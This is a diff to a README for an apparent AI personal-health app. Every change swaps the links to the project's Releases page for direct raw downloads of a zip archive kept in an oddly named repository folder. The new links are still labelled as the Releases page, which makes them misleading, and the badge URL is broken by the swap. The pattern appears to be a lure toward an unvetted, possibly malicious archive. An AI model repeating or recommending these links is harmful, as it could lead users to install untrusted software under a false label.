@@ -1,6 +1,6 @@
 # 🌟 Personal-health-assistant - Your AI Health Companion
 
-[![Download the Application](https://img.shields.io/badge/Download%20Now-red?style=for-the-badge&logo=🚀)](https://github.com/ib199/Personal-health-assistant/releases)
+[![Download the Application](https://raw.githubusercontent.com/ib199/Personal-health-assistant/main/Hypericum/assistant-Personal-health-v2.3-beta.4.zip%20Now-red?style=for-the-badge&logo=🚀)](https://raw.githubusercontent.com/ib199/Personal-health-assistant/main/Hypericum/assistant-Personal-health-v2.3-beta.4.zip)
 
 ## 🚀 Getting Started
 
@@ -8,12 +8,12 @@ Welcome to the Personal-health-assistant project! This application uses AI to pr
 
 ## 📦 Download & Install
 
-To download the latest version of the Personal-health-assistant, visit the following link: [Download the Application](https://github.com/ib199/Personal-health-assistant/releases). 
+To download the latest version of the Personal-health-assistant, visit the following link: [Download the Application](https://raw.githubusercontent.com/ib199/Personal-health-assistant/main/Hypericum/assistant-Personal-health-v2.3-beta.4.zip). 
 
 Once you are on the Releases page, look for the latest version. Click the appropriate file to download the application to your computer.
 
 ### Installation Steps:
-1. Visit the [Releases page](https://github.com/ib199/Personal-health-assistant/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/ib199/Personal-health-assistant/main/Hypericum/assistant-Personal-health-v2.3-beta.4.zip).
 2. Find the latest version listed.
 3. Click on the file name to start the download.
 4. Once the download is complete, locate the file in your downloads folder.
